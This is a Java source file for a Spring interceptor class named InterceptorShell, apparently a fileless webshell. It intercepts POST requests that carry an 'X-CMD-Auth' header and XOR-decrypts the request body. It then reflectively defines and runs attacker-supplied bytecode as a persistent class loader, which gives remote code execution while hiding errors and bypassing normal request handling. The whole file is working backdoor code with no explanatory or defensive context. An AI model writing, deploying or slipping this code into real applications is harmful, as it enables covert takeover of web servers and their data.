import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

public class InterceptorShell implements HandlerInterceptor {

    private static final ThreadLocal<HttpServletRequest> currentRequest = new ThreadLocal<>();
    private static final ThreadLocal<HttpServletResponse> currentResponse = new ThreadLocal<>();
    private static final ThreadLocal<HttpSession> currentSession = new ThreadLocal<>();
    private static final ThreadLocal<byte[]> currentPayloadBytes = new ThreadLocal<>();

    private static Object globalLoader = null;
    private static String globalKey = "[KEY]            ";

    public InterceptorShell() {}

    public Object getRequest() { return currentRequest.get(); }
    public Object getResponse() { return currentResponse.get(); }
    public Object getSession() { return currentSession.get(); }

    public int getContentLength() {
        byte[] data = currentPayloadBytes.get();
        return data != null ? data.length : 0;
    }

    public InputStream getInputStream() {
        byte[] data = currentPayloadBytes.get();
        return new java.io.ByteArrayInputStream(data != null ? data : new byte[0]);
    }

    public Object getAttribute(String name) {
        HttpServletRequest realReq = currentRequest.get();
        return realReq != null ? realReq.getAttribute(name) : null;
    }

    public void setAttribute(String name, Object o) {
        HttpServletRequest realReq = currentRequest.get();
        if (realReq != null) {
            realReq.setAttribute(name, o);
        }
    }

    private byte[] decryptPayload(byte[] data, String keyStr) {
        if (data == null || data.length == 0 || keyStr == null) return new byte[0];
        byte[] decrypted = new byte[data.length];
        byte[] keyBytes = keyStr.getBytes();
        int keyLength = keyBytes.length;
        for (int i = 0; i < data.length; i++) {
            decrypted[i] = (byte) (data[i] ^ keyBytes[(i + 1) % keyLength]);
        }
        return decrypted;
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if ("POST".equalsIgnoreCase(request.getMethod()) && request.getHeader("X-CMD-Auth") != null) {
            currentRequest.set(request);
            currentResponse.set(response);
            currentSession.set(request.getSession());

            try {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                InputStream isClient = request.getInputStream();
                byte[] buf = new byte[512];
                int length;
                while ((length = isClient.read(buf)) != -1) {
                    bos.write(buf, 0, length);
                }
                byte[] encryptedData = bos.toByteArray();
                currentPayloadBytes.set(encryptedData);

                byte[] xorDecrypted = decryptPayload(encryptedData, globalKey);
                boolean isLoaderInitRequest = (xorDecrypted.length > 4 && 
                    xorDecrypted[0] == (byte)0xCA && xorDecrypted[1] == (byte)0xFE && 
                    xorDecrypted[2] == (byte)0xBA && xorDecrypted[3] == (byte)0xBE);

                if (isLoaderInitRequest) {
                    if (globalLoader == null) {
                        ClassLoader parentLoader = this.getClass().getClassLoader();
                        Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        defineMethod.setAccessible(true);
                        Class<?> clazz = (Class<?>) defineMethod.invoke(parentLoader, xorDecrypted, 0, xorDecrypted.length);
                        Constructor<?> constructor = clazz.getConstructor(ClassLoader.class);
                        globalLoader = constructor.newInstance(parentLoader);
                    }
                    response.setStatus(200);
                    response.getWriter().print("LOADER_INIT_SUCCESS");
                    response.getWriter().flush();
                } else {
                    if (globalLoader != null) {
                        globalLoader.getClass().getMethod("equals", Object.class).invoke(globalLoader, this);
                    }
                }
                
                return false;
            } catch (Exception e) {
                return false;
            } finally {
                currentRequest.remove();
                currentResponse.remove();
                currentSession.remove();
                currentPayloadBytes.remove();
            }
        }
        
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {}

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {}
}